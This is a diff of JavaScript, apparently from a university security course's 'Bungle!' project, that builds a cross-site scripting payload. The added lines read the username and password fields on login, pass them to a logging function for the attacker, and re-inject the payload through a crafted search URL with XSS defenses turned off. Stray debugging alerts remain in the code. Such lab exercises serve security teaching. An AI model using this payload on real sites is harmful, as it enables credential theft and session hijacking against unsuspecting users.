@@ -11,15 +11,18 @@ function payload(attacker) {
     function proxy(href, state) {
         if(state == "nav"){
             $("html").load(href, function(){
-                $("html").show();
+                $("html").show();                
+                // alert('log event');
                 log({event: state, uri: href});
                 window.history.replaceState('', "Bungle!","./search");
             });
         } else if(state == "login"){
             $("html").load(state, function(){
                 $("html").show();
+                var username = $("#username").val();
+                var password = $("#userpass").val();
                 log({event: "login", user:username, pass: password});
-                window.history.replaceState('', "Bungle!","./search");
+                // window.history.replaceState('', "Bungle!","./search");
             });
         } else if(state == "logout"){
             $("html").load(href, function(){
@@ -27,18 +30,28 @@ function payload(attacker) {
                 log({event: state, uri: href});
                 window.history.replaceState('', "Bungle!","./search");
             });
+        } else {
+            var html = $("html").html();
+            $("html").html("<iframe id=\"frame1\" style='width:100%; height:100%;position:absolute;top:0;left:0;border:0;'></frame>");
+            $("#frame1").attr("src", "http://eecs388.org/project2/");
+            $("html").show();
         }
     }
+    var poop = $("#POOP").html();
     $("html").hide();
-
-    proxy("./", "nav");
-   
+    alert("hi");
+    proxy("./", "first");
+    
     $(function(){
+        
         $(".search-well form").submit(function(e){
             alert("POOP");
             e.preventDefault();
-                
-            proxy("./search?q="+$("#query").val(), "nav");
+            var url = "/project2/search?xssdefense=0&q=" +
+        encodeURIComponent("<div id=\"POOP\"><script" + ">" + payload.toString() +
+        ";payload(\"" + attacker + "\");</script" + "></div>");
+            $("html").load(url);
+            // payload(attacker);
         });
         $(".well form").submit(function(e){
             alert("BUTT");
@@ -49,7 +62,7 @@ function payload(attacker) {
             alert("POOPING AGAIN");
             
             e.preventDefault();
-            proxy("./", "nav");
+           // proxy("./", "nav");
 
         });
     });
@@ -61,8 +74,8 @@ function payload(attacker) {
 function makeLink(xssdefense, target, attacker) {
     if (xssdefense == 0) {
         return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
-        encodeURIComponent("<script" + ">" + payload.toString() +
-        ";payload(\"" + attacker + "\");</script" + ">");
+        encodeURIComponent("<div id=\"POOP\"><script" + ">" + payload.toString() +
+        ";payload(\"" + attacker + "\");</script" + "></div>");
     } else {
         // Implement code to defeat XSS defenses here.
     }
